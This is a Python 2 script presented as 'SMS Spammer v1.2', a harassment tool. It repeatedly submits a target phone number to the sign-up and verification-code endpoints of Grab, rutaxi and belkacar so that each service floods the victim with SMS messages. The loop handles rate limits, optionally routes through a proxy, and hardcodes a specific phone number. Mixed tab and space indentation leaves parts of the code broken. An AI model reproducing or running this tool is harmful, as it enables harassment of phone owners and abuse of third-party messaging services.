class spymer:
    author = ''

    def main(self):
        print '+-+-+-+-+-+-+-+ SMS Spammer v1.2\n|S|p|a|m|m|e|r|\tAuthor: FSystem88\n+-+-+-+-+-+-+-+ https://github.com/FSystem88\n\t\t'
        import requests, datetime, sys, time, argparse
        parser = argparse.ArgumentParser(prog='spymer ', description="Fucking shit by FSystem88. May be not work. LOL", epilog='Contact me by mail fsystem88@bk.ru')
        parser.add_argument('phonenum', metavar='phone', help='the phone number to send SMS. (example: 79153509908)')
        parser.add_argument('--delay', type=int, help='the delay time (wait time) in seconds')
        parser.add_argument('--proxy', type=int, help="use a proxy (format: '69.69.69.69:8080')")
        args = parser.parse_args()

        def showstatus(message, type='new'):
            now = datetime.datetime.now().strftime('%H:%M:%S')
            icon = '*'
            if type == 'warn':
                icon = '!'
            else:
                if type == 'new':
                    icon == '*'
            message = '[' + icon + '][' + now + ']' + message
            return message

        def wrapsbrace(string, endspace=False):
            if endspace == True:
                return '[' + string + '] '
            return '[' + string + ']'

        def sleep(x):
            try:
                time.sleep(x)
            except KeyboardInterrupt:
                print '\r' + showstatus(wrapsbrace('except', True) + 'KeyboardInterrupt thrown! Exiting . . .', 'warn')
                exit()

        _phone = args.phonenum
        if _phone[0] == '0':
            _phone = list(_phone)
            _phone[0] = '62'
            _phone = ('').join(_phone)
        if _phone[0] == '8':
            _phone = '62' + str(_phone)
        iteration = 1
        print showstatus(wrapsbrace('info', True) + ('Send SMS to: {}').format(_phone))
        delaytime = 60
        if self.author != 'FSystem88':
            while True:
                print showstatus(wrapsbrace('200 OK', True) + ('No original tools! Sleeping f0r {}s . . . (iteration:{})').format(delaytime, iteration))
                sleep(60)
                iteration += 1

        if args.delay:
            delaytime = int(args.delay)
        while True:
            try:
                if not args.proxy:
                    grab = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com', 'deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
                else:
                    grab = requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={}, proxies={'http': args.proxy, 'https': args.proxy})
            except KeyboardInterrupt:
                print '\r' + showstatus(wrapsbrace('except', True) + 'KeyboardInterrupt thrown! Exiting . . .', 'warn')
                exit()
            except requests.exceptions.ConnectionError:
                print showstatus(wrapsbrace('except', True) + ('ConnectionError thrown! Sleeping for {}s . . .').format(delaytime), 'warn')
                sleep(delaytime)
            else:
                if grab.status_code == 429:
                    print showstatus(wrapsbrace(('429 {}').format(grab.reason), True) + ('Sleeping for {}s . . .').format(delaytime), 'warn')
				
                    rutaxi = requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': '9153509908'}, headers={})
					if rutaxi.status_code == 429:
						print showstatus(wrapsbrace(('429 {}').format(rutaxi.reason), True) + ('Sleeping for {}s . . .').format(delaytime), 'warn')

						belka = requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': '79153509908'}, headers={})
						if belka.status_code == 429:
							print showstatus(wrapsbrace(('429 {}').format(belka.reason), True) + ('Sleeping for {}s . . .').format(delaytime), 'warn')
							exit()
						elif belka.status_code == 200:
							print showstatus(wrapsbrace('200 OK', True) + ('SMS sent! Sleeping for {}s . . . (iteration:{})').format(delaytime, iteration))
							iteration += 1
							sleep(60)
						else:
							print showstatus(wrapsbrace(('{} {}').format(belka.status_code, belka.reason), True) + 'Something went wrong. Exiting . . .', 'warn')
							exit()

					elif rutaxi.status_code == 200:
						print showstatus(wrapsbrace('200 OK', True) + ('SMS sent! Sleeping for {}s . . . (iteration:{})').format(delaytime, iteration))
						iteration += 1
						sleep(60)
					else:
						print showstatus(wrapsbrace(('{} {}').format(rutaxi.status_code, rutaxi.reason), True) + 'Something went wrong. Exiting . . .', 'warn')
						exit()

                elif grab.status_code == 200:
                    print showstatus(wrapsbrace('200 OK', True) + ('SMS sent! Sleeping for {}s . . . (iteration:{})').format(delaytime, iteration))
                    iteration += 1
                    sleep(1)
                else:
                    print showstatus(wrapsbrace(('{} {}').format(grab.status_code, grab.reason), True) + 'Something went wrong. Exiting . . .', 'warn')
                    exit()
